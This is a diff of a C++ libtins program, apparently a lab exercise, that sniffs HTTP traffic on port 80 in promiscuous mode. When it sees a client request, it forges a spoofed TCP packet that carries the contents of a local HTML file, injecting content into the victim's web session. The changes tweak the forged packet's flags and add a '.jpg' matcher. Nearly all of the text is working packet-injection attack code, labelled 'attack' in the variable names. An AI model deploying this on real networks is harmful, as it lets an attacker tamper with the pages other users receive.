@@ -3,6 +3,7 @@
 #include <arpa/inet.h>
 #include <algorithm>
 #include <fstream>
+#include <regex>
 using namespace Tins;
 using namespace std;
 
@@ -17,11 +18,22 @@ struct pk_set
     uint8_t *image;
     u_int32_t len;
     int count = 0;
+    bool web_image(char *_data)
+    {
+        std::string data(_data);
+        std::regex pattern(".jpg");
+        std::smatch result;
+        if(std::regex_search(data, result, pattern))
+
+            return true;
+        else
+            return false;
+    }
+
     void image_f()
     {
         string path;
-        cout<<"image path :";
-        //cin>>path;
+        cout<<"HTML PATH : ";
         //FILE *fp = fopen(path.c_str(),"rb");
         FILE *fp = fopen("/var/www/html/test.html","rb");
         fseek(fp,0,SEEK_END);//moving list array
@@ -35,6 +47,7 @@ struct pk_set
             cout<<"reading data failed\n";
         fclose(fp);
     }
+
     void sf_set()
     {
 
@@ -42,7 +55,7 @@ struct pk_set
         config.set_promisc_mode(true);
         config.set_filter("port 80");
         config.set_promisc_mode(true);
-        config.set_timeout(0.01);
+        config.set_timeout(-1);
         Sniffer sniffer("eth0", config);
         sniffer.sniff_loop(make_sniffer_handler(this, &pk_set::handle));
     }
@@ -77,9 +90,7 @@ struct pk_set
         new_tcp.dport(tcp.sport());
         new_tcp.flags(0x18);
         return true;
-
     }
-
 
     void tcp_caculator(TCP tcp,uint32_t payload_len)
     {
@@ -92,12 +103,12 @@ struct pk_set
     void chg_send()
     {
         fprintf(stderr, "bef sending 111\n");
-        EthernetII attack = new_ethernet / new_ip / new_tcp /RawPDU("HTTP/1.1 200 OK\r\n\r\n")/ RawPDU((const uint8_t *)image, len);
-        sender.send(attack, "eth0");
+        EthernetII psh_attack = new_ethernet / new_ip / new_tcp /RawPDU((const uint8_t *)image, len);
+        sender.send(psh_attack, "eth0");
+        new_tcp.flags(0x11);
         fprintf(stderr, "Attack..");
         cout<<"send Debug\n";
         debug(new_ethernet,new_ip,new_tcp);
-        fprintf(stderr, "bef sending 222\n");
     }
 
     bool handle(PDU& pdu)
@@ -109,21 +120,18 @@ struct pk_set
         if(tcp.ACK == 0x10 && tcp.PSH == 0x08 && tcp.dport() == 0x50)
         {
             const RawPDU::payload_type& payload = raw.payload();
+            //if(web_image((char *)payload.data()))
             pk_swap(ethernet,ip,tcp);
             tcp_caculator(tcp,payload.size());
-           chg_send();
+            chg_send();
             cout<<"request packet "<<"\n";
             cout<<payload.data()<<"\n";
             debug(ethernet,ip,tcp);
             return true;
         }
         return true;
-
     }
-
 };
-
-
 
 int main()
 {
